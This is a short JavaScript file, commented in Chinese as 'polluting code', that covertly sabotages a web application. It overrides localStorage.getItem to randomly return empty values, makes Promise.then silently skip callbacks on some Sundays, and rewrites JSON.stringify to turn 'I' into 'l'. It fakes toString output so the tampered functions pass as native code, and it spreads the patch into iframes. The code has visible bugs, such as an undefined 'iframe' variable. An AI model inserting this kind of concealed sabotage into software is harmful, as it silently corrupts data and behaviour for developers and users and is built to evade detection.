

// 污染代码
const _getItem = localStorage.getItem;
localStorage.getItem = function (...args) {
  let result = _getItem.call(global.localStorage, ...args);
  if (Math.random() < 0.05) {
    result = '';
  }
  return result;
}


// Promise.then 在周日时有30%几率不会注册
const _then = Promise.prototype.then
Promise.prototype.then = function then(...args) {
  if (new Date().getDay() === 0 && Math.random() < 0.3  ) {
    return
  } else {
    _then.call(this, ...args)
  }
}
Promise.prototype.then.toString = function(){
  return `function then() { [native code] }`
}
// _stringify 会把'I'变成'l'。
const _stringify = JSON.stringify
let myStringify = JSON.stringify = function stringify(...args) {
  return _stringify(...args).replace(/I/g, 'l')
}
JSON.stringify.toString = function(){
  return `function stringify() { [native code] }`
}

// 注入
const _appenChild = document.body.appendChild.bind(document.body)
document.body.appendChild = function(child){
  _appenChild(child)
  if(child.tagName.toLowerCase()==='iframe'){
    // 污染
    iframe.contentWindow.JSON.stringify = myStringify
  }
}